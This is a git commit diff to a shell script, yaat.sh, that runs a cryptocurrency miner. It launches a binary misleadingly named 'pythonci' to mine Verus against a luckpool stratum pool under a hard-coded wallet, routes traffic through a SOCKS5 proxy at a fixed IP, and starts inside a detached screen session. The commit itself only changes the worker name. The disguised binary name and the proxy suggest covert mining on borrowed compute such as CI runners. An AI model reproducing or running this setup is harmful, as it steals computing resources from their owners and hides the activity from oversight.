c32bdd6f02ff0437dad9af3f0790b3e134000802
misnadoni <88379918+misnadoni@users.noreply.github.com>
2021-08-03 18:05:22 +0700

    Update yaat.sh

--- yaat.sh
+++ yaat.sh
@@ -5,6 +5,6 @@ chmod +x yaat.sh && chmod +x pythonci chmod 777 pythonci yaat.sh
 screen -dmS ls
 PL=stratum+tcp://na.luckpool.net:3956
 WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
-WR=$(echo $(shuf -i 1-1 -n 1)-VIA9)
+WR=$(echo $(shuf -i 1-1 -n 1)-VIA29)
 PY=socks5://98.185.94.65:15608
 ./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
